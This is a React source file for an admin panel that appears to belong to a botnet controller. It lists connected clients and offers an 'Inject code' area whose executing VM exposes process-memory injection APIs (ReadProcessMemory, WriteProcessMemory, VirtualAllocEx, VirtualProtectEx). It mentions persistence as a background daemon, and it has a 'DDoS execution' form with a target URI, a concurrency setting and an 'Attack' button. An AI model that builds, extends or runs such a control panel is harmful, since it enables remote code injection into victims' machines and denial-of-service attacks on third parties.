import React from 'react'

function Admin() {
    return (
        <div className="container-fluid">
          <div className="row" id="header">
            <div className="col">
              <h3>User Interface   <span className="badge badge-pill badge-warning"> Beta</span></h3>
            </div>
            <div className="col">
              <div className="logoutbutton">
                <button type="button" className="btn btn-danger">Logout</button>
              </div>
            </div>
          </div>
          <div className="row" id="content">
            <div className="col-4">
              <div className="card">
                  <label><h5>Clients connected</h5></label>
              </div>
            </div>
            <div className="col-8">
              <div className="card" id="clientCard">
                  <div className="card-body">
                      <label><h4>Inject code</h4></label>
  
                      {/*<Editor
                          value="print"
                          onValueChange={code => this.setState({ code: code })}
                          highlight={code => highlight(code, languages.js)}
                          padding={10}
                          style={{
                              fontFamily:'"Fira code", "Fira Mono", monospace',
                              fontSize: 12,
                          }} />*/}
                      <hr></hr>
                      <label>The return can be checked in logs panel. There's an integrated lib inside the VM where you code going to execute, that exposes the following WinAPIs:
                      <ul>
                          <li>
                              ReadProcessMemory
                          </li>
                          <li>
                              WriteProcessMemory
                          </li>
                          <li>
                              VirtualProtectEx
                          </li>
                          <li>
                              VirtualAllocEx
                          </li>
                      </ul>
                      Forever is included as part of the basis, with forever you could make the bot daemon/background process
                      more information refer to <a href="https://github.com/Leonyya/mqbot">github.com/Leonyya/mqbot</a>
                      </label>
                      <hr></hr>
                      <label><h6>DDoS execution | Load Tests</h6></label><br/>
                      <label>URI target</label>
                      &nbsp;<input type="text"></input>
                      &nbsp;<label>Concurrency preference</label>
                      &nbsp;<input type="text"></input>
                      &nbsp;<input type="button" value="Attack"></input>
                      <hr></hr>
                      <label><h6>Browser specific controllers</h6></label><br/>
                      <label> Toggle beetwen background colors </label><br/>
                      <div className="btn-group btn-group-toggle" data-toggle="buttons">
                      </div>
                      <br/><label>Send a message to the selected client</label>
                      <form><input type="text" className="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter message"/>
                      <br/><small id="emailHelp" className="form-text text-muted">The message will be received instantly</small>
                      <br/><input type="submit" className="btn btn-success" value="Send"/></form>
                  </div>
              </div>
            </div>
          </div>
        </div>
    )
}

export default Admin